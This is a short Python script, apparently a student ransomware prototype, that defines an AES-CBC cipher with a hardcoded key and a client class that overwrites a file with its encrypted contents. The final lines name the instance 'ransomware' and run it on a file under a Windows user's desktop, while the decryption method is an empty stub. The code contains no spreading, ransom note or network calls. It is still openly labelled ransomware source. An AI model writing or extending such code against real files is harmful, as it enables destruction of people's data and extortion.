import base64
from Crypto.Cipher import AES
from Crypto import Random
from numpy import pad

BS = 16
def pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0: pad_len = block_size
    return data + bytes([pad_len]) * pad_len

def unpad(padded: bytes, block_size: int = 16) -> bytes:
    pad_len = padded[-1]
    if pad_len < 1 or pad_len > block_size:
        raise ValueError("bad padding")
    if padded[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("bad padding")
    return padded[:-pad_len]

class AESCipher:
    def __init__( self, key ):
        self.key = key.encode('utf-8')

    def encrypt( self, raw ):
        raw = pad(raw) #add text to fit the block size
        iv = Random.new().read( AES.block_size ) # Create more randome bytes to marge with secret key
        cipher = AES.new( self.key, AES.MODE_CBC, iv ) #Creat AES key
        encprypted_text = cipher.encrypt( raw ) # Encrypt the text
        return base64.b64encode( iv + encprypted_text ) #return encrypted text with base64 encoding

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)#decode base 64 encoded text
        iv = enc[:16] #read IV froe the cipher text
        cipher = AES.new(self.key, AES.MODE_CBC, iv ) #Creat AES key
        return unpad(cipher.decrypt( enc[16:] ))# decode the text and remove padding bytes


class client:
    def __init__(self, key):
        self.encryptor = AESCipher(key)
        
    def encrypt_file(self, file_path):
        plaintext = self.read_file(file_path)
        encrypted_text = self.encryptor.encrypt(plaintext)
        self.write_file(file_path, encrypted_text)

    def decrypt_file(self, file_path):
        pass

    def read_file(self,path):
        with open(path, 'rb') as file:
            plaintext = file.read()
            return plaintext
        
    def write_file(self, path, data):
        with open(path, 'wb') as encrypted_file:
            encrypted_file.write(data)
            
ransomware = client(key="shaytheking12345") # Must be 16 bytes for AES-128, 24 for AES-192, or 32 for AES-256
ransomware.encrypt_file("C://Users//Admin//Desktop//shay//academia//sustroyani//shay.txt")